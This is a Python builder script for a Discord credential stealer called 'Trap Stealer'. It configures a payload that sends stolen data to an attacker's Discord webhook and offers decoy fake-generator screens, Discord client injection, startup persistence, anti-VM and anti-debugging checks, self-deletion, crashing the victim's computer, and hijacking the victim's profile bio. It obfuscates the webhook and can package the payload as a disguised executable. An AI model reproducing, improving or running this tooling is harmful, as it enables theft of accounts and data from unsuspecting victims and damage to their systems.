import os, platform, subprocess, shutil, random, requests

while True:
    os.makedirs('./Build', exist_ok=True)
    shutil.copy('main.py', './Build/Trap-Stl-Building.py')

    def clear_console():
        operating_system = platform.system()
        if operating_system == 'Windows':
            os.system('cls')
        else:
            os.system('clear')

    def get_boolean_input(prompt):
        while True:
            user_input = input(prompt).lower()
            if user_input in ['y', 'yes']:
                return True
            elif user_input in ['n', 'no']:
                return False
            else:
                print('Invalid input. Please enter Y or N.')

    with open('main.py', 'r', encoding='utf-8', errors='replace') as file:
        content = file.read()

    while True:
        try:
            Webhook = input('Enter the webhook -> ')

            re = requests.get(Webhook)
            if re.status_code == 200 and ('discord.com' in Webhook or 'discordapp.com' in Webhook):
                print('Valid Webhook')
                break
            else:
                print('Invalid Webhook')
        except:
            print('Invalid Webhook')

    FakeWeb = get_boolean_input('Do you want to enable Fake Webhook Module (When the file is launched it will show a Webhook Tools while getting data) Y/N: ')
    FakeGen = get_boolean_input('Do you want to enable Fake Generator Module (When the file is launched it will show a nitro generator while getting data) Y/N: ')
    Injection = get_boolean_input('Do you want to inject the script to discord Startup Y/N: ')
    Startup = get_boolean_input('Do you want to add the file to the startup folder? Y/N: ')
    No_Debug = get_boolean_input('Do you want to enable VM Checker and Anti Debugging Y/N: ')
    Close = get_boolean_input('Do you want to prevent Discord from being launched again? Y/N: ')
    OneTime = get_boolean_input('Do you want to add the anti-spammer (so he can launch only every 30 minutes)? Y/N: ')
    melter = get_boolean_input('Do you enable melter (Delete the file after using it DONT WORK WITH CRASHER) ? Y/N: ')
    crasher = get_boolean_input('Do you want the program to make the computer crash after it stole everything? Y/N: ')
    hide = get_boolean_input('Do you want the program to make the console invisible? Y/N: ')
    change = get_boolean_input('Do you want to change the user (discord account) about me with custom text? Y/N: ')
    if change:
        bio = input(r'''Input the text you want the user to have in his about me (Right-click to paste) or put \n to skip a line -> ''')

    if melter:
        crasher = False

    def generate_key(length):
        key = list(range(256))
        random.shuffle(key)
        return bytes(key[:length])

    def obf(text, key):
        encrypted = []
        for char in text:
            encrypted_char = key[char]
            encrypted.append(encrypted_char)
        return bytes(encrypted)

    key_length = 512
    custom_key = generate_key(key_length)

    Webhook = obf(Webhook.encode(), custom_key)
    new_content = content.replace("'%Webhook%'", f'{str(Webhook)}' + ',' + f'{str(custom_key)}')
    new_content = new_content.replace("'%FakeWebhook%'", str(FakeWeb))
    new_content = new_content.replace("'%FakeGen%'", str(FakeGen))
    new_content = new_content.replace("'%Injection%'", str(Injection))
    new_content = new_content.replace("'%Startup%'", str(Startup))
    new_content = new_content.replace("'%No_Debug%'", str(No_Debug))
    new_content = new_content.replace("'%Close%'", str(Close))
    new_content = new_content.replace("'%Onetime%'", str(OneTime))
    new_content = new_content.replace("'%Melter%'", str(melter))
    new_content = new_content.replace("'%Crash%'", str(crasher))
    new_content = new_content.replace("'%Hide%'", str(hide))
    new_content = new_content.replace("'%ChangeBio%'", str(change))
    if change:
        new_content = new_content.replace("'%Text%'", str(f"'''{bio}'''"))

    with open(f'./Build/temp.py', 'w', encoding='utf-8') as file:
        file.write(new_content)
    clear_console()
    print('Created [+]')

    Obfuscation = input('Do you want to obfuscate it? Y/N: ')
    Obfuscation = Obfuscation.lower()
    Exe = input('Do you want to make Trap Stealer with the exe format? (Take some time) Y/N: ')
    Exe = Exe.lower()
    name = input('Enter how you want the file to be named (Do not put the extension): ')

    while True:
        if Obfuscation in ['y', 'yes']:
            try:
                with open(f'./Build/{name}.py', 'w', encoding='utf-8') as file:
                    file.write(new_content)
                subprocess.run(['python', 'obfuscator.py', f'{name}'], check=False)
                break
            except subprocess.CalledProcessError:
                print('Obfuscation process encountered an error.')
                break
        elif Obfuscation in ['n', 'no']:
            with open(f'./Build/{name}.py', 'w', encoding='utf-8') as file:
                file.write(new_content)
                print(f'[+] File Created {name}.py')
                if Exe in ['y', 'yes']:
                    pass
                else:
                    input('Press any key to quit...')
                    quit()
                break
        else:
            Obfuscation = input('Invalid input. Please enter Y or N: ')
            Obfuscation = Obfuscation.lower()

    while True:
        if Exe in ['y', 'yes']:
            icon_path = input('Enter the path to the icon file (leave blank for no icon): ')

            if icon_path.strip():
                icon_option = f'--icon={icon_path}'
            else:
                icon_option = ''
            from sys import executable

            try:
                __import__('Crypto')
            except ImportError:
                subprocess.Popen(f'"{executable}" -m pip install Crypto --quiet', shell=True)
                subprocess.Popen(f'"{executable}" -m pip install pycryptodome --quiet', shell=True)

            try:
                __import__('pyinstaller')
            except ImportError:
                subprocess.Popen(f'"{executable}" -m pip install pyinstaller --quiet', shell=True)

            command = [
                'python',
                '-m',
                'pyinstaller',
                '--onefile',
                '--distpath',
                './Build',
                icon_option, 
                f'./Build/{name}.py'
            ]
            try:
                subprocess.run(command, check=True)
            except:
                command = [
                    'python',
                    '-m',
                    'pyinstaller',
                    '--onefile',
                    '--distpath',
                    './Build',
                    icon_option, 
                    f'./Build/{name}.py'
                ]
                subprocess.run(command, check=True)
            input(f'File {name}.exe successfully created press any key to quit')
            quit()
        else:
            input('Press any key to quit')
            quit()
